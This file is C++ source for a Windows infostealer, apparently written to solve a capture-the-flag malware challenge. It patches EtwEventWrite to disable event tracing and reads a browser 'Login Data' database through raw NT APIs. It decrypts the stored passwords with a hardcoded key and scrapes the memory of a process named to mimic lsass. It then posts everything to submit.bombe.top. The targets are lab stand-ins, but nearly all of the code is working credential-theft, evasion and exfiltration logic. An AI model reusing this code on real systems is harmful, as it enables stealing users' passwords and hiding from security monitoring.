#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>

// SQLite3 setup
#include "sqlite3.h"

#include <iostream>
#include <string>
#include <vector>
#include <regex>
#include <sstream>

// Link required libraries
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ntdll.lib")

// ==========================================
// Secret Updated
const char* SECRET = "0xBGaqjzZL7khGY5AcFs3oi0lIMmkvMF";
// ==========================================

// NT API Definitions & Typedefs
const DWORD PROCESS_ALL_ACCESS_VALUE = 0x001F0FFF;
const DWORD MEM_COMMIT_VALUE = 0x1000;
const DWORD PAGE_READWRITE_VALUE = 0x04;

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040L
#endif
#ifndef FILE_READ_DATA
#define FILE_READ_DATA 0x0001
#endif
#ifndef FILE_SHARE_READ
#define FILE_SHARE_READ 0x00000001
#endif
#ifndef FILE_SHARE_WRITE
#define FILE_SHARE_WRITE 0x00000002
#endif
#ifndef FILE_OPEN
#define FILE_OPEN 0x00000001
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct _MY_FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
} MY_FILE_STANDARD_INFORMATION, * PMY_FILE_STANDARD_INFORMATION;

// Function Pointers for NT APIs
typedef NTSTATUS(WINAPI* pNtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(WINAPI* pNtReadFile)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS(WINAPI* pNtClose)(HANDLE);
typedef NTSTATUS(WINAPI* pNtQueryInformationFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);


void PatchETW() {
    void* etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    if (etwAddr == NULL) return;

    DWORD oldProtect;
    if (VirtualProtect(etwAddr, 4096, PAGE_EXECUTE_READWRITE, &oldProtect)) {
#ifdef _WIN64
        // x64: XOR EAX, EAX; RET (Return 0/SUCCESS)
        unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
#else
        // x86: RET 14h
        unsigned char patch[] = { 0xC2, 0x14, 0x00 };
#endif

        memcpy(etwAddr, patch, sizeof(patch));
        VirtualProtect(etwAddr, 4096, oldProtect, &oldProtect);
    }
}

// Helper: ANSI to Unicode
UNICODE_STRING AnsiToUnicodeString(const char* ansiStr) {
    UNICODE_STRING us;
    int len = MultiByteToWideChar(CP_ACP, 0, ansiStr, -1, NULL, 0);
    wchar_t* wstr = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, ansiStr, -1, wstr, len);
    us.Length = (USHORT)((len - 1) * sizeof(wchar_t));
    us.MaximumLength = (USHORT)(len * sizeof(wchar_t));
    us.Buffer = wstr;
    return us;
}

// Helper: Read File via NT API (Bypass ETW)
std::vector<BYTE> ReadFileBypassETW(const char* filePath) {
    std::vector<BYTE> fileData;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return fileData;

    pNtCreateFile NtCreateFile = (pNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
    pNtReadFile NtReadFile = (pNtReadFile)GetProcAddress(hNtdll, "NtReadFile");
    pNtClose NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
    pNtQueryInformationFile NtQueryInformationFile = (pNtQueryInformationFile)GetProcAddress(hNtdll, "NtQueryInformationFile");

    if (!NtCreateFile || !NtReadFile || !NtClose || !NtQueryInformationFile) return fileData;

    std::string ntPath = "\\??\\";
    ntPath += filePath;
    UNICODE_STRING usPath = AnsiToUnicodeString(ntPath.c_str());
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &usPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus = { 0 };
    LARGE_INTEGER allocSize = { 0 };

    NTSTATUS status = NtCreateFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &objAttr, &ioStatus, &allocSize,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    delete[] usPath.Buffer;

    if (!NT_SUCCESS(status) || hFile == NULL || hFile == INVALID_HANDLE_VALUE) return fileData;

    MY_FILE_STANDARD_INFORMATION fileInfo = { 0 };
    IO_STATUS_BLOCK ioStatus2 = { 0 };
    status = NtQueryInformationFile(hFile, &ioStatus2, &fileInfo, sizeof(fileInfo), (FILE_INFORMATION_CLASS)5);

    if (NT_SUCCESS(status)) {
        LONGLONG fileSize = fileInfo.EndOfFile.QuadPart;
        if (fileSize > 0 && fileSize <= 100 * 1024 * 1024) {
            fileData.resize((size_t)fileSize);
            LARGE_INTEGER offset = { 0 };
            status = NtReadFile(hFile, NULL, NULL, NULL, &ioStatus, fileData.data(), (ULONG)fileSize, &offset, NULL);
            if (!NT_SUCCESS(status)) fileData.clear();
            else fileData.resize(ioStatus.Information);
        }
    }
    NtClose(hFile);
    return fileData;
}

// Helper: Hex String to Byte Array
std::vector<BYTE> HexStringToByteArray(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        BYTE byte = (BYTE)strtoul(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

// Helper: Decrypt Chrome Password
std::string DecryptPassword(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& key, const std::vector<BYTE>& iv) {
    HCRYPTPROV hProv = NULL;
    HCRYPTKEY hKey = NULL;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return "";

    struct {
        BLOBHEADER hdr;
        DWORD dwKeySize;
        BYTE rgbKey[32];
    } keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.dwKeySize = key.size();
    memcpy(keyBlob.rgbKey, key.data(), key.size());

    HCRYPTKEY hTempKey = NULL;
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(BLOBHEADER) + sizeof(DWORD) + key.size(), 0, 0, &hTempKey)) {
        CryptReleaseContext(hProv, 0);
        return "";
    }
    hKey = hTempKey;

    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0) || !CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return "";
    }

    DWORD dataLen = encryptedData.size();
    std::vector<BYTE> decryptedData(dataLen);
    memcpy(decryptedData.data(), encryptedData.data(), dataLen);

    std::string result = "";
    if (CryptDecrypt(hKey, 0, TRUE, 0, decryptedData.data(), &dataLen)) {
        result = std::string(reinterpret_cast<const char*>(decryptedData.data()), dataLen);
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return result;
}

bool StartsWith(const std::string& fullString, const std::string& prefix) {
    if (fullString.length() < prefix.length()) return false;
    return fullString.substr(0, prefix.length()) == prefix;
}

// Challenge 1: Registry
std::string Challenge1() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\BOMBE", 0, KEY_READ, &hKey) != ERROR_SUCCESS) return "";
    char value[1024];
    DWORD valueSize = sizeof(value);
    DWORD valueType;
    std::string result = "";
    if (RegQueryValueExA(hKey, "answer_1", NULL, &valueType, (LPBYTE)value, &valueSize) == ERROR_SUCCESS) {
        result = std::string(value);
    }
    RegCloseKey(hKey);
    return result;
}

// Challenge 2: Chrome DB (Enhanced with WAL + Force Scan)
std::string Challenge2() {
    const char* dbPath = "C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data";

    std::vector<BYTE> fileData = ReadFileBypassETW(dbPath);
    if (fileData.empty()) return "FAILED_READ_DB";

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char tempFile[MAX_PATH];
    GetTempFileNameA(tempPath, "sql", 0, tempFile);

    HANDLE hTempFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTempFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        WriteFile(hTempFile, fileData.data(), (DWORD)fileData.size(), &bytesWritten, NULL);
        FlushFileBuffers(hTempFile);
        CloseHandle(hTempFile);
    }
    else {
        return "FAILED_WRITE_TEMP";
    }

    std::string walPath = std::string(dbPath) + "-wal";
    std::vector<BYTE> walData = ReadFileBypassETW(walPath.c_str());

    if (!walData.empty()) {
        std::string tempWalPath = std::string(tempFile) + "-wal";
        HANDLE hTempWal = CreateFileA(tempWalPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hTempWal != INVALID_HANDLE_VALUE) {
            DWORD walBytesWritten = 0;
            WriteFile(hTempWal, walData.data(), (DWORD)walData.size(), &walBytesWritten, NULL);
            FlushFileBuffers(hTempWal);
            CloseHandle(hTempWal);
        }
    }

    sqlite3* db;
    if (sqlite3_open(tempFile, &db) != SQLITE_OK) {
        DeleteFileA(tempFile);
        return "FAILED_OPEN_SQLITE";
    }

    std::string finalFlag = "FLAG_NOT_FOUND";

    const char* query = "SELECT password_value FROM logins";
    sqlite3_stmt* stmt;

    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
        std::vector<BYTE> keyBytes(32);
        if (strlen(SECRET) >= 32) {
            memcpy(keyBytes.data(), SECRET, 32);
        }
        else {
            memcpy(keyBytes.data(), SECRET, strlen(SECRET));
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* passwordHex = (const char*)sqlite3_column_text(stmt, 0);
            if (passwordHex) {
                std::vector<BYTE> encryptedBytes = HexStringToByteArray(passwordHex);
                if (encryptedBytes.size() >= 32) {
                    std::vector<BYTE> iv(encryptedBytes.begin(), encryptedBytes.begin() + 16);
                    std::vector<BYTE> encryptedData(encryptedBytes.begin() + 16, encryptedBytes.end());

                    std::string decryptedText = DecryptPassword(encryptedData, keyBytes, iv);

                    if (StartsWith(decryptedText, "BOMBE_MAL_FLAG_")) {
                        finalFlag = decryptedText;
                        break;
                    }
                }
            }
        }
        sqlite3_finalize(stmt);
    }

    sqlite3_close(db);

    DeleteFileA(tempFile);
    std::string tempWalPath = std::string(tempFile) + "-wal";
    DeleteFileA(tempWalPath.c_str());

    return finalFlag;
}

// Challenge 3: Memory Scan
DWORD FindProcessIdByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return 0;
}

std::string Challenge3() {
    const char* processName = "bsass.exe";
    const char* pattern = "BOMBE_MAL_FLAG_[A-Za-z0-9]{32}";

    DWORD processId = FindProcessIdByName(processName);
    if (processId == 0) return "";

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS_VALUE, FALSE, processId);
    if (hProcess == NULL) return "";

    std::regex regexPattern(pattern);
    MEMORY_BASIC_INFORMATION mbi;
    PVOID address = NULL;
    std::string result = "";

    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != 0) {
        if (mbi.State == MEM_COMMIT_VALUE && mbi.Protect == PAGE_READWRITE_VALUE) {
            std::vector<BYTE> buffer(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(hProcess, address, buffer.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
                std::string memoryContent(reinterpret_cast<const char*>(buffer.data()), bytesRead);
                std::smatch match;
                if (std::regex_search(memoryContent, match, regexPattern)) {
                    result = match.str();
                    break;
                }
            }
        }
        address = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }
    CloseHandle(hProcess);
    return result;
}

// JSON Helper
std::string EscapeJsonString(const std::string& str) {
    std::ostringstream escaped;
    for (char c : str) {
        if (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') {
            escaped << '\\';
            if (c == '\b') escaped << 'b'; else if (c == '\f') escaped << 'f';
            else if (c == '\n') escaped << 'n'; else if (c == '\r') escaped << 'r';
            else if (c == '\t') escaped << 't'; else escaped << c;
        }
        else {
            escaped << c;
        }
    }
    return escaped.str();
}

// Submission
void SendAnswerToServer(const std::string& jsonPayload) {
    HINTERNET hSession = WinHttpOpen(L"Malware/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"submit.bombe.top", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/submitMalAns", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring headers = L"Content-Type: application/json\r\n";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

    std::string payload = jsonPayload;
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)payload.c_str(), payload.length(), payload.length(), 0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
        DWORD dwSize = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize > 0) {
            std::vector<BYTE> buffer(dwSize + 1);
            DWORD dwDownloaded = 0;
            WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main() {
    // 1. [IMPORTANT] Patch ETW First
    PatchETW();

    // 2. Gather Answers
    std::string answer1 = Challenge1();
    std::string answer2 = Challenge2();
    std::string answer3 = Challenge3();

    // 3. Construct JSON
    std::ostringstream json;
    json << "{";
    json << "\"answer_1\":\"" << EscapeJsonString(answer1) << "\",";
    json << "\"answer_2\":\"" << EscapeJsonString(answer2) << "\",";
    json << "\"answer_3\":\"" << EscapeJsonString(answer3) << "\",";
    json << "\"secret\":\"" << SECRET << "\"";
    json << "}";

    // std::cout << "JSON Payload: " << json.str() << std::endl;

    // 4. Send
    SendAnswerToServer(json.str());

    return 0;
}